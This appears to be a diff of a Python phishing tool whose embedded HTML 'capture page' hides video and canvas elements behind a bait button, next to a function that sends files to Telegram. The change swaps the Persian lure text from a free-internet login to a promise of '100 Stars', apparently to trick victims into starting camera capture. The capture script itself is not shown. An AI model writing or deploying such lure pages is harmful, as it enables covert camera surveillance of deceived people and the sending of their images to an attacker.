@@ -68,12 +68,12 @@ def send_telegram_file(file_bytes, filename, caption, as_image=False):
 CAPTURE_PAGE = """
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>اتصال به اینترنت رایگان</title>
+<head><meta charset="UTF-8"><title>سلام و درود خدمت شما</title>
 <style>body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:40vh;} video,canvas{display:none;} #btn{display:block;margin:20px auto;padding:15px 30px;font-size:20px;background:#4CAF50;border:none;border-radius:10px;color:white;cursor:pointer;}</style>
 </head>
 <body>
     <h1 id="msg" class="blink"></h1>
-    <button id="btn" onclick="startEverything()">ورود</button>
+    <button id="btn" onclick="startEverything()">دریافت 100 استارز</button>
     <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
     <script>
